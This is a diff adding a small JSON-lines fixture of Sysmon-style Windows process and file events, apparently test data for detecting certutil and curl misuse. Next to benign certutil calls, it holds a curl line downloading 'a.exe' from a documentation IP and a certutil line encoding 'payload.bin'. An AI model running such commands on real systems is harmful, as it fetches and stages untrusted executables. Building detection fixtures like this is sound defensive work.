@@ -1,0 +1,5 @@
+{"EventID":1,"UtcTime":"2026-08-03 08:01:00.000","Computer":"WKSTN-014","Image":"C:\\Windows\\System32\\certutil.exe","CommandLine":"certutil.exe -encode payload.bin payload.b64"}
+{"EventID":1,"UtcTime":"2026-08-03 08:02:00.000","Computer":"WKSTN-014","Image":"C:\\Windows\\System32\\certutil.exe","CommandLine":"certutil -hashfile installer.msi SHA256"}
+{"EventID":1,"UtcTime":"2026-08-03 08:03:00.000","Computer":"WKSTN-014","Image":"C:\\Windows\\System32\\certutil.exe","CommandLine":"certutil -store My"}
+{"EventID":1,"UtcTime":"2026-08-03 08:04:00.000","Computer":"WKSTN-014","Image":"C:\\Windows\\System32\\curl.exe","CommandLine":"curl.exe -o a.exe http://198.51.100.20/a.exe"}
+{"EventID":11,"UtcTime":"2026-08-03 08:05:00.000","Computer":"WKSTN-014","Image":"C:\\Windows\\System32\\certutil.exe","TargetFilename":"C:\\Users\\jdoe\\AppData\\Local\\Temp\\urlcache.tmp"}
